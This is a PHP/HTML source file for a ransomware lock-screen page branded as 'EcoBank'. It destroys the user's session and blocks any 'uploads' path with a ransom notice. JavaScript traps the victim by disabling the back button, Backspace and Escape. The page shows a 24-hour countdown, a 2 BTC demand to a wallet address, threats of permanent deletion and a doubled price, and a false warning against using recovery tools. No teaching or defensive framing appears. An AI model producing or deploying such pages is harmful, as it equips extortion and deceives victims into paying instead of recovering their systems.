<?php
if (session_status() === PHP_SESSION_NONE) session_start();
session_unset();
session_destroy();

// Block access to uploads folder
if (strpos($_SERVER['REQUEST_URI'], 'uploads') !== false) {
    http_response_code(403);
    echo '<!DOCTYPE html>
<html>
<head>
    <title>Access Denied - EcoBank</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a0a0a 0%, #2d0a0a 100%);
            color: #fff;
            text-align: center;
            padding: 50px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .warning {
            background: rgba(220, 38, 38, 0.1);
            border: 1px solid rgba(220, 38, 38, 0.4);
            border-radius: 20px;
            padding: 3rem;
            max-width: 600px;
            backdrop-filter: blur(10px);
        }
        .warning h1 { font-size: 2rem; color: #ef4444; margin-bottom: 1rem; }
        .warning p { color: #fca5a5; margin-bottom: 1rem; }
        .back-btn {
            display: inline-block;
            background: linear-gradient(135deg, #dc2626, #b91c1c);
            color: white;
            padding: 0.8rem 2rem;
            border-radius: 50px;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s;
            margin-top: 1rem;
        }
        .back-btn:hover { transform: translateY(-2px); }
    </style>
</head>
<body>
    <div class="warning">
        <h1>⚠️ ACCESS DENIED</h1>
        <p>Access to uploads folder is blocked during ransomware attack!</p>
        <p>Please pay the ransom to restore access.</p>
        <a href="ransom_locker.php" class="back-btn">Return to Ransom Page</a>
    </div>
</body>
</html>';
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ SYSTEM LOCKED — EcoBank Security Alert</title>
    <script>
        // Disable back button
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
        };

        // Disable keyboard navigation
        document.addEventListener("keydown", function(e) {
            if (e.key === "Backspace" || e.key === "Escape") {
                e.preventDefault();
            }
        });

        // Live countdown timer
        function startCountdown(duration) {
            let timer = duration;
            const display = document.getElementById('countdown');
            setInterval(function () {
                const h = Math.floor(timer / 3600);
                const m = Math.floor((timer % 3600) / 60);
                const s = timer % 60;
                display.textContent =
                    String(h).padStart(2, '0') + ':' +
                    String(m).padStart(2, '0') + ':' +
                    String(s).padStart(2, '0');
                if (--timer < 0) {
                    display.textContent = "00:00:00";
                    display.style.color = "#ef4444";
                }
            }, 1000);
        }
        window.onload = function () { startCountdown(86400); };
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0606 0%, #1a0a0a 50%, #0d0505 100%);
            min-height: 100vh;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            padding: 2rem 1rem;
        }

        /* Pulsing background overlay */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: radial-gradient(ellipse at center, rgba(220, 38, 38, 0.08) 0%, transparent 70%);
            animation: pulse-bg 3s ease-in-out infinite alternate;
            pointer-events: none;
            z-index: 0;
        }

        @keyframes pulse-bg {
            from { opacity: 0.5; }
            to { opacity: 1; }
        }

        /* EcoBank logo bar at top */
        .logo-bar {
            width: 100%;
            max-width: 900px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 1rem 1.5rem;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            margin-bottom: 2rem;
            backdrop-filter: blur(10px);
            position: relative;
            z-index: 1;
        }

        .logo-brand {
            display: flex;
            align-items: center;
            gap: 0.6rem;
            font-size: 1.4rem;
            font-weight: 700;
            color: #4ade80;
        }

        .logo-brand span { font-size: 1.6rem; }

        .security-badge {
            display: flex;
            align-items: center;
            gap: 0.4rem;
            background: rgba(220, 38, 38, 0.2);
            border: 1px solid rgba(220, 38, 38, 0.4);
            color: #fca5a5;
            padding: 0.4rem 1rem;
            border-radius: 50px;
            font-size: 0.8rem;
            font-weight: 600;
            letter-spacing: 0.05em;
            animation: badge-pulse 2s ease-in-out infinite;
        }

        @keyframes badge-pulse {
            0%, 100% { border-color: rgba(220, 38, 38, 0.4); box-shadow: none; }
            50% { border-color: rgba(220, 38, 38, 0.8); box-shadow: 0 0 12px rgba(220, 38, 38, 0.3); }
        }

        /* Main card */
        .lock-card {
            width: 100%;
            max-width: 900px;
            position: relative;
            z-index: 1;
        }

        /* Alert header */
        .alert-header {
            background: linear-gradient(135deg, rgba(220, 38, 38, 0.25) 0%, rgba(185, 28, 28, 0.15) 100%);
            border: 1px solid rgba(220, 38, 38, 0.4);
            border-radius: 20px 20px 0 0;
            padding: 2.5rem;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .alert-header::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 3px;
            background: linear-gradient(90deg, transparent, #dc2626, #ef4444, #dc2626, transparent);
            animation: scan-line 2s linear infinite;
        }

        @keyframes scan-line {
            0% { background-position: -200% 0; }
            100% { background-position: 200% 0; }
        }

        .lock-icon {
            font-size: 4rem;
            display: block;
            margin-bottom: 1rem;
            animation: shake 0.8s ease-in-out infinite alternate;
        }

        @keyframes shake {
            from { transform: rotate(-3deg); }
            to { transform: rotate(3deg); }
        }

        .alert-header h1 {
            font-size: 2rem;
            font-weight: 800;
            color: #ef4444;
            letter-spacing: 0.02em;
            text-shadow: 0 0 20px rgba(239, 68, 68, 0.5);
            margin-bottom: 0.8rem;
        }

        .alert-header p {
            color: #fca5a5;
            font-size: 1rem;
            line-height: 1.6;
            max-width: 600px;
            margin: 0 auto;
        }

        /* Timer section */
        .timer-section {
            background: rgba(0, 0, 0, 0.4);
            border-left: 1px solid rgba(220, 38, 38, 0.3);
            border-right: 1px solid rgba(220, 38, 38, 0.3);
            padding: 2rem;
            text-align: center;
        }

        .timer-label {
            font-size: 0.75rem;
            font-weight: 600;
            letter-spacing: 0.15em;
            color: #9ca3af;
            text-transform: uppercase;
            margin-bottom: 0.8rem;
        }

        .countdown {
            font-size: 3.5rem;
            font-weight: 800;
            letter-spacing: 0.08em;
            color: #facc15;
            font-variant-numeric: tabular-nums;
            text-shadow: 0 0 30px rgba(250, 204, 21, 0.4);
            font-family: 'Courier New', monospace;
        }

        .timer-warning {
            margin-top: 0.6rem;
            color: #f87171;
            font-size: 0.85rem;
        }

        /* Payment info */
        .payment-section {
            background: rgba(0, 0, 0, 0.35);
            border-left: 1px solid rgba(220, 38, 38, 0.3);
            border-right: 1px solid rgba(220, 38, 38, 0.3);
            padding: 2rem;
        }

        .payment-title {
            font-size: 1rem;
            font-weight: 700;
            color: #f3f4f6;
            margin-bottom: 1.2rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .payment-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .payment-item {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 1rem 1.2rem;
        }

        .payment-item strong {
            display: block;
            font-size: 0.7rem;
            font-weight: 600;
            letter-spacing: 0.1em;
            text-transform: uppercase;
            color: #9ca3af;
            margin-bottom: 0.4rem;
        }

        .payment-item .value {
            font-size: 1rem;
            color: #f3f4f6;
            font-weight: 600;
            word-break: break-all;
        }

        .payment-item .value.btc { color: #fb923c; }

        .threats {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }

        .threat-row {
            display: flex;
            align-items: center;
            gap: 0.6rem;
            font-size: 0.9rem;
            color: #fca5a5;
            background: rgba(220, 38, 38, 0.1);
            border-radius: 8px;
            padding: 0.6rem 1rem;
        }

        /* Action area */
        .action-section {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(220, 38, 38, 0.4);
            border-top: none;
            border-radius: 0 0 20px 20px;
            padding: 2rem;
            text-align: center;
        }

        .warning-note {
            font-size: 0.85rem;
            color: #facc15;
            margin-bottom: 1.5rem;
            padding: 0.8rem 1.2rem;
            background: rgba(250, 204, 21, 0.08);
            border: 1px solid rgba(250, 204, 21, 0.2);
            border-radius: 10px;
        }

        .pay-btn {
            display: inline-block;
            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
            color: white;
            padding: 1.2rem 3rem;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: 700;
            text-decoration: none;
            box-shadow: 0 8px 30px rgba(220, 38, 38, 0.4);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            letter-spacing: 0.02em;
        }

        .pay-btn::before {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
            transition: left 0.5s;
        }

        .pay-btn:hover::before { left: 100%; }
        .pay-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 40px rgba(220, 38, 38, 0.6);
        }

        .transaction-id {
            margin-top: 1.5rem;
            font-size: 0.75rem;
            color: #4b5563;
        }

        @media (max-width: 640px) {
            .alert-header h1 { font-size: 1.5rem; }
            .countdown { font-size: 2.5rem; }
            .logo-bar { flex-direction: column; gap: 1rem; text-align: center; }
            .payment-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <!-- EcoBank Branded Top Bar -->
    <div class="logo-bar">
        <div class="logo-brand">
            <span>🌿</span> EcoBank
        </div>
        <div class="security-badge">
            🔴 &nbsp; SECURITY ALERT — ACCOUNT LOCKED
        </div>
    </div>

    <!-- Main Lock Card -->
    <div class="lock-card">
        <!-- Alert Header -->
        <div class="alert-header">
            <span class="lock-icon">🔒</span>
            <h1>⚠️ YOUR SYSTEM HAS BEEN LOCKED ⚠️</h1>
            <p>
                Your entire banking system has been locked by ransomware!<br>
                You cannot access any applications, files, or system functions.<br>
                All your personal data and system access has been blocked.
            </p>
        </div>

        <!-- Countdown Timer -->
        <div class="timer-section">
            <div class="timer-label">⏰ Time Remaining to Pay</div>
            <div class="countdown" id="countdown">24:00:00</div>
            <div class="timer-warning">⚡ Price doubles when timer reaches zero</div>
        </div>

        <!-- Payment Info -->
        <div class="payment-section">
            <div class="payment-title">🔑 System Unlock Required</div>
            <div class="payment-grid">
                <div class="payment-item">
                    <strong>Ransom Amount</strong>
                    <div class="value btc">2.0 BTC (Bitcoin)</div>
                </div>
                <div class="payment-item">
                    <strong>Wallet Address</strong>
                    <div class="value">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</div>
                </div>
                <div class="payment-item">
                    <strong>Payment Deadline</strong>
                    <div class="value">24 Hours</div>
                </div>
                <div class="payment-item">
                    <strong>Attack ID</strong>
                    <div class="value">#LK-<?php echo rand(100000, 999999); ?></div>
                </div>
            </div>

            <div class="threats">
                <div class="threat-row">⚠️ Failure to pay within 24 hours will result in permanent system lock!</div>
                <div class="threat-row">⚠️ All your data will be permanently deleted!</div>
                <div class="threat-row">⚠️ Price doubles after deadline!</div>
            </div>
        </div>

        <!-- Action Section -->
        <div class="action-section">
            <div class="warning-note">
                ⚡ Don't try to restart your system or use recovery tools — this may cause permanent damage!
            </div>

            <a href="unlock_locker.php" class="pay-btn">💰 Pay Now &amp; Unlock System</a>

            <div class="transaction-id">
                Transaction ID: #LK-2024-<?php echo rand(100000, 999999); ?> &nbsp;|&nbsp; EcoBank Security Division
            </div>
        </div>
    </div>
</body>
</html>
